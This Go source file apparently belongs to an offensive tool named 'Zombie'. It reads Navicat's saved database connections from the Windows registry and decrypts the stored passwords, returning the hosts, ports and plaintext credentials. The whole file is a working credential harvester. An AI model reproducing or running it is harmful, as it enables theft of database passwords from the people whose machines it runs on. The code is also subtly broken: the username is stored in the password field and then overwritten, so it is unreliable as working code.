package Utils

import (
	"Zombie/src/ZbCrypto"
	"golang.org/x/sys/windows/registry"
	"strconv"
)

var ServersRegPath = map[string]string{
	"MySQL Server":      "Software\\PremiumSoft\\Navicat\\Servers",
	"MariaDB Server":    "Software\\PremiumSoft\\NavicatMARIADB\\Servers",
	"MongoDB Server":    "Software\\PremiumSoft\\NavicatMONGODB\\Servers",
	"MSSQL Server":      "Software\\PremiumSoft\\NavicatMSSQL\\Servers",
	"OracleSQL Server":  "Software\\PremiumSoft\\NavicatOra\\Servers",
	"PostgreSQL Server": "Software\\PremiumSoft\\NavicatPG\\Servers",
	"SQLite Server":     "Software\\PremiumSoft\\NavicatSQLite\\Servers",
}

type NavicatInfo struct {
	InfoName string
	Ip       string
	Port     string
	Username string
	Password string
}

func ReadNavicatReg() (InfoList []NavicatInfo) {

	for _, path := range ServersRegPath {
		key, exists := registry.OpenKey(registry.CURRENT_USER, path, registry.ALL_ACCESS)

		if exists != nil {
			continue
		}
		keys, _ := key.ReadSubKeyNames(0)
		for _, key_subkey := range keys {
			// 输出所有子项的名字
			NewNavicatInfo := NavicatInfo{InfoName: key_subkey}
			subkey, subexists := registry.OpenKey(key, key_subkey, registry.ALL_ACCESS)
			if subexists != nil {
				continue
			}

			username, _, err := subkey.GetStringValue("UserName")
			if err == nil {
				NewNavicatInfo.Password = username
			}

			password, _, err := subkey.GetStringValue("Pwd")
			if err == nil {
				password, err = ZbCrypto.DeNavicat(password)
				if err != nil {
					NewNavicatInfo.Password = "Decrypt failed"
				} else {
					NewNavicatInfo.Password = password
				}

			}

			port, _, err := subkey.GetIntegerValue("Port")
			if err == nil {
				NewNavicatInfo.Port = strconv.Itoa(int(port))
			}

			ip, _, err := subkey.GetStringValue("Host")
			if err == nil {
				NewNavicatInfo.Ip = ip
			}

			InfoList = append(InfoList, NewNavicatInfo)

			subkey.Close()
		}
		key.Close()

	}
	return InfoList
}
